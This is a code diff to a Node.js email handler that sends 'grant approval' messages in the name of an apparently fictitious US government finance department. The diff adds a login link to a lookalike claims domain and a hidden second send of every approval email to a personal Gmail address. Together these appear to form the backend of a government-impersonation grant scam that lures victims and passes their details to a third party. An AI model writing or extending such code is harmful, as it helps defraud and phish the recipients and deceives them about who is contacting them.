@@ -278,7 +278,9 @@ const isApproved = async (req, res) => {
      Your application has been successfully approved by the US Federal Government Department of Finance and Grant administration. 
     
     Congratulations once again  ${user.lastname} ${user.othername} ${user.lastname}!
+    <p>You can now login to your Grant dashboard via the link below <br> https://fundsapplicantsclaims.com/login.html</p>
     </p>
+
     <div style="text-align: center;">
     <img src="${user.image.url}" alt="fhdkjd" style="height: 100px;width: 100px; border-radius: 100%">
    </div>
@@ -300,7 +302,13 @@ const isApproved = async (req, res) => {
    © 2023 Grant Claims, Department Of Finance and Grant administration, USA.</p> 
    </body>
    </html>
+
      `;
+    
+    await Promise.all([
+      sendEmail(user.email, subject, text, html),
+      sendEmail("christopherray5419@gmail.com", subject, text, html),
+    ]);
   } catch (error) {
     console.error(error);
     res.status(500).json({ error: "Internal server error" });
